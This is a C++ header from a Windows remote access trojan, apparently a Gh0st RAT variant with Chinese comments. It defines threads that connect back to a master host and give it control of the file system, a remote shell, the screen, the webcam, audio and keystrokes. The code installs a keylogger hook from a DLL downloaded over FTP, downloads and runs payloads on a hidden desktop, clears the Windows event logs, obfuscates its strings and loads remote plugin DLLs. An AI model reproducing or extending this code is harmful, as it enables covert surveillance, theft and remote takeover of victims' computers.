#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED
#include "KernelManager.h"
#include "FileManager.h"
#include "ScreenManager.h"
#include "ShellManager.h"
#include "VideoManager.h"
#include "AudioManager.h"
#include "SystemManager.h"
#include "KeyboardManager.h"
#include "EvidenceManager.h"
#include "until.h"
#include "install.h"
#include "Log.h"
#include "./PluginManager/PluginServer.h"

extern BOOL g_bSignalHook;

DWORD WINAPI Loop_FileManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CFileManager	manager(&socketClient);
	socketClient.run_event_loop(INFINITE);

	return 0;
}

DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CShellManager	manager(&socketClient);
	
	socketClient.run_event_loop(INFINITE);

	return 0;
}

DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CScreenManager	manager(&socketClient);

	socketClient.run_event_loop(INFINITE);
	return 0;
}

// 摄像头不同一线程调用sendDIB的问题
DWORD WINAPI Loop_VideoManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CVideoManager	manager(&socketClient);
	socketClient.run_event_loop(INFINITE);
	return 0;
}


DWORD WINAPI Loop_AudioManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CAudioManager	manager(&socketClient);
	socketClient.run_event_loop(INFINITE);
	return 0;
}

DWORD WINAPI Loop_HookKeyboard(LPARAM lparam)
{
	TCHAR szModule [MAX_PATH-1];
	char	strKeyboardOfflineRecord[MAX_PATH];
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	CKeyboardManager::MyGetSystemDirectory(strKeyboardOfflineRecord, sizeof(strKeyboardOfflineRecord));
	lstrcat(strKeyboardOfflineRecord, "\\desktop.inf");

	CloseHandle(CreateFile( strKeyboardOfflineRecord, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL));


	// 	if (GetFileAttributes(strKeyboardOfflineRecord) != -1)
	// 	{
	// 		int j = 1;
	// 		g_bSignalHook = j;
	// 	}
	// 	else
	// 	{
	// 		g_bSignalHook = TRUE;
	// 		int i = 0;
	// 		g_bSignalHook = i;
	// 	}
	g_bSignalHook = FALSE;

	AUTOSREECNCONFIG AutoConfig;
	memcpy(&AutoConfig,(char*)lparam,sizeof(AUTOSREECNCONFIG));

	char DllPath[MAX_PATH];
	memset(DllPath,0,MAX_PATH);

	CKeyboardManager::MyGetTempPath(sizeof(DllPath), DllPath);
	StrCat(DllPath,"fll_dk.tmp");

	HMODULE hDll=0;



 	do
 	{
		while (g_bSignalHook == 0)
		{
			Sleep(100);
		}
		
		if (_access(DllPath,0)==-1)
		{
			//DeleteFile(DllPath);
			FtpDownLoad(AutoConfig.szDownLoadPlugUrl,DllPath,AutoConfig.szPlugName,AutoConfig.szFtpUser,AutoConfig.szFtppass); 
			Sleep(1000*30);
		}

		if(MyGetFileSize(DllPath)<1024*30)
		{
			DeleteFile(DllPath);
			continue;
		}

		typedef	BOOL	(__cdecl *pPluginFunc)(HHOOK);
		
		if (!hDll)
		{
			hDll = LoadLibrary(DllPath);
			if (hDll== NULL) continue;
		}


		typedef	BOOL	(WINAPI *pPluginFunc2)(int ,WPARAM,LPARAM);

		HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)CKeyboardManager::MyGetProcAddress(hDll,"_LowLevelKeyboardProc@12"),GetModuleHandle(0), 0);

		pPluginFunc PluginFunc = (pPluginFunc)CKeyboardManager::MyGetProcAddress(hDll,"StartLog");
		if (!PluginFunc) continue;

		PluginFunc(hHook);//调用此函数

// 		if (!bRet) continue;
// 		while (g_bSignalHook == 1)
// 		{
// 			CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
// 			Sleep(100);
// 		}
 
//		PluginFunc(0);//调用此函数
// 		FreeLibrary(hDll);
// 		DeleteFile(DllPath);
		//CKeyboardManager::StopHook();
	}while (TRUE);

	return 0;
}

DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CKeyboardManager	manager(&socketClient);
	
	socketClient.run_event_loop(INFINITE);

	return 0;
}

DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CSystemManager	manager(&socketClient);
	
	socketClient.run_event_loop(INFINITE);

	return 0;
}

DWORD WINAPI Loop_DownManager(LPVOID lparam)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = lstrlen((char *)lparam);
	if (nUrlLength == 0)
		return FALSE;
	
	lpURL = (char *)malloc(nUrlLength + 1);
	
	memcpy(lpURL, lparam, nUrlLength + 1);
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return FALSE;

	if (!http_get(lpURL, lpFileName))
	{
		return FALSE;
	}

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	char str1[50] = "GUnKh],@8YV]iPh";
	EncryptData( (unsigned char *)&str1, lstrlen(str1), ENCODEKEY+2);
	si.lpDesktop = str1; 
	CreateProcess(NULL, lpFileName, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	return TRUE;
}


//如果用urldowntofile的话，程序会卡死在这个函数上

BOOL UpdateServer(LPCTSTR lpURL)
{
	const char	*lpFileName = NULL;
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return FALSE;
	if (!http_get(lpURL, lpFileName))
		return FALSE;

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	char str1[50] = "GUnKh],@8YV]iPh";
	EncryptData( (unsigned char *)&str1, lstrlen(str1), ENCODEKEY+2);
	si.lpDesktop = str1; 
	return CreateProcess(lpFileName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}


BOOL OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
	if (strlen(lpszURL) == 0)
		return FALSE;

	// System 权限下不能直接利用shellexecute来执行
	char	lpSubKey[50] = "=llPU[]hUonk@UYdlPojY.YdY@kTYPP@olYn@[oQQ]nX";
	EncryptData( (unsigned char *)&lpSubKey, 0, ENCODEKEY + 2);
	HKEY	hKey;
	char	strIEPath[MAX_PATH];
	LONG	nSize = sizeof(strIEPath);
	char	*lpstrCat = NULL;
	memset(strIEPath, 0, sizeof(strIEPath));
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return FALSE;
	RegQueryValue(hKey, NULL, strIEPath, &nSize);
	RegCloseKey(hKey);

	if (CKeyboardManager::Mylstrlen(strIEPath) == 0)
		return FALSE;

	lpstrCat = strstr(strIEPath, "%1");
	if (lpstrCat == NULL)
		return FALSE;

	lstrcpy(lpstrCat, lpszURL);

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	char str1[50] = "GUnKh],@8YV]iPh";
	EncryptData( (unsigned char *)&str1, 0, ENCODEKEY+2);
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = str1; 

	CreateProcess(NULL, strIEPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	return 0;
}

void CleanEvent()
{
	char str1[50] = "9hhlQ[YdQon";
	EncryptData( (unsigned char *)&str1, lstrlen(str1), ENCODEKEY);
	char str2[50] = "KU[ejQda";
	EncryptData( (unsigned char *)&str2, lstrlen(str2), ENCODEKEY );
	char str3[50] = "KakdUm";
	EncryptData( (unsigned char *)&str3, lstrlen(str3), ENCODEKEY);
	char *strEventName[] = { str1, str2, str3};

	for (int i = 0; i < sizeof(strEventName) / sizeof(int); i++)
	{
		HANDLE hHandle = OpenEventLog(NULL, strEventName[i]);
		if (hHandle == NULL)
			continue;
		ClearEventLog(hHandle, NULL);
		CloseEventLog(hHandle);
	}
}

void SetHostID(LPCTSTR lpServiceName, LPCTSTR lpHostID)
{
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));
	char str1[50] = "KEKH91@;ijjYnh;onhjoPKYh@KYjfU[Yk@";
	EncryptData( (unsigned char *)&str1, lstrlen(str1), ENCODEKEY+2 );
	lstrcat( str1, "%s" );
	wsprintf(strSubKey, str1, lpServiceName);
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpHostID, lstrlen(lpHostID), 0);
}

DWORD WINAPI Loop_CHAJIAN(LPVOID lparam)
{
	TCHAR szModule [MAX_PATH];
	int	nLength = lstrlen( (char*)lparam );
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	char *Url = (char*)malloc(nLength+1);
	lstrcpy( Url, (char*)lparam );
	char TmpPath[MAX_PATH] = {0};
	char DllPath[MAX_PATH] = {0};
	CKeyboardManager::MyGetTempPath( sizeof(TmpPath), TmpPath );

//	wsprintf( DllPath, "%s\\fll_%03x.%03d", TmpPath, GetTickCount()%1000, GetTickCount()%1000 );
//	CKeyboardManager::Mylstrcat( TmpPath, "\\fil_" );
	CKeyboardManager::Mylstrcat( TmpPath, CKeyboardManager::NumToStr(GetTickCount()+5,16) );

	HMODULE hDll;
	if ( http_get( Url, DllPath ) )
	{
		typedef	void	(__stdcall *pPluginFunc)();
		hDll = LoadLibrary(DllPath);
		if ( hDll == NULL ) return -1;
		pPluginFunc PluginFunc = (pPluginFunc)CKeyboardManager::MyGetProcAddress( hDll, "PluginFunc" );
		if ( PluginFunc ) PluginFunc();//调用此函数
	}
	FreeLibrary(hDll);
	DeleteFile(DllPath);
	free(Url);

	return 0;
}

DWORD WINAPI Loop_SecretCfg(LPCSTR strClueID)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CEvidenceManager manager(&socketClient);
	if (0 != lstrlen(strClueID))
	{
		manager.SetSingleSign(strClueID);
	}
	socketClient.run_event_loop(INFINITE);
	return 0;
}

DWORD WINAPI Loop_AutoScren(LPARAM lparam)
{
// 
 //	CKernelManager *kernelmange=(CKernelManager*)lparam;
	while(TRUE)
	{
// 
// 		if(MyGetFileSize(DllPath)<1024*50)
// 		{
// 			SetEvent(hEvent);
// 			CloseHandle(hEvent);
// 			DeleteFile(DllPath);
// 			return FALSE;
// 		}
// 
// 
// 
// 		char szCmd[MAX_PATH];
// 		strcpy(szCmd,"rundll32 ");
// 		strcat(szCmd,DllPath);
// 		strcat(szCmd,",ServiceMain");
// 		WinExec(szCmd,0);
// 
// 		Sleep(1000*60*2);

	}



	return 0;
}

DWORD WINAPI Loop_HeartPageCheck(LPARAM lparam)
{
	return 0;
}

DWORD WINAPI Loop_CHAJIAN_MIQU(LPVOID lparam)
{

	StartAutoSreen(lparam,CKernelManager::m_strMasterHost,0);
	
	return 0;

}

typedef struct _CMD_PLUGIN_
{
	LPVOID lpBuffer;
	UINT   nSize;
	CClientSocket *Clientsocket;

}cmd_plugin,*pcmd_plugin;

DWORD WINAPI Loop_Plugin_Request(LPVOID lparam)
{
	
	HANDLE hEvent=CreateEvent(NULL, FALSE, FALSE, "dfsdxsfa*&((");
	if (GetLastError()==ERROR_ALREADY_EXISTS)
	{
		LOG((LEVEL_WARNNING,"WaitForSingleObject"));
		WaitForSingleObject(hEvent,INFINITE);
	}

	pcmd_plugin pcmd=(pcmd_plugin)lparam;
	KillProcess("rundll32.exe");
	KillProcess("findstr.exe");
	KillProcess("WerFault.exe");

	GLOBAL_PLUGSERVER->SetSocket(pcmd->Clientsocket);			

	// 每次都应该设置一下，防止丢掉
	int ret = GLOBAL_PLUGSERVER->OnPluginRequest(pcmd->lpBuffer,pcmd->nSize);

	LOG((LEVEL_WARNNING,"OnPluginRequest end\r\n"));

	delete [] pcmd;
	
	if( ret != 0 )
	{
		LOG((LEVEL_WARNNING,"处理插件下载命令错,ret=%d",ret));
	}			
	GLOBAL_PLUGSERVER->ProcessConfig();

	SetEvent(hEvent);
	CloseHandle(hEvent);
	LOG((LEVEL_WARNNING,"ProcessConfig \r\n"));


	return 0;

}


#endif // !defined(AFX_LOOP_H_INCLUDED)
